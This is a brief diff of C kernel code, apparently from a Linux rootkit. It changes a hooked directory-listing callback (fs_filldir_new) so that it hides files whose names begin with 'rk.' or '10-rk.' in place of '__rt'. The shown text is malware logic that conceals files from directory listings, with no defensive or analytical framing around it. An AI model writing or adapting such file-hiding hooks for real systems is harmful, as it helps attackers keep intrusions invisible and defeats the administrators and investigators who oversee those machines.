@@ -211,7 +211,7 @@ static int proc_iterate_new(struct file *filp, struct dir_context *ctx)
 static int fs_filldir_new(void *buf, const char *name, int namelen,
     loff_t offset, u64 ino, unsigned d_type)
 {
-    if(hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7)))
+    if(hide_files && (!strncmp(name, "rk.", 3) || !strncmp(name, "10-rk.", 6)))
         return 0;
 
     return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
